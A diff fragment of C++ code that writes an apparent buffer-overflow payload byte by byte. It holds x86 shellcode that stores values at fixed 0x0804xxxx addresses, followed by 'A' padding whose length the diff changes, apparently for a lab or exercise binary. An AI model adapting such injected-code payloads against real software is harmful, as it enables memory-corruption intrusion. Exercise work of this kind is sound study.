@@ -147,32 +147,17 @@ file << (char)0x09;
 file << (char)0x00;
 file << (char)0x00;
 file << (char)0x00;
-file << (char)0xc7;
-file << (char)0x45;
-file << (char)0xfc;
-file << (char)0x07;
-file << (char)0x00;
-file << (char)0x00;
-file << (char)0x00;
-file << (char)0x8b;
-file << (char)0x45;
-file << (char)0xfc;
-file << (char)0x69;
-file << (char)0xd0;
-file << (char)0x90;
-file << (char)0x01;
-file << (char)0x00;
-file << (char)0x00;
 file << (char)0xb8;
+file << (char)0x00;
+file << (char)0x00;
+file << (char)0x00;
+file << (char)0x00;
+file << (char)0xc7;
 file << (char)0x80;
-file << (char)0xb7;
+file << (char)0xb0;
+file << (char)0xc2;
 file << (char)0x04;
 file << (char)0x08;
-file << (char)0x01;
-file << (char)0xd0;
-file << (char)0xc7;
-file << (char)0x40;
-file << (char)0x40;
 file << (char)0x09;
 file << (char)0x00;
 file << (char)0x00;
@@ -240,7 +225,7 @@ file << (char)0x04;
 file << (char)0x08;
 file << (char)0xc3;
 
-  for(int i = 0; i < 58; i ++){
+  for(int i = 0; i < 73; i ++){
     file << 'A';
   }
 
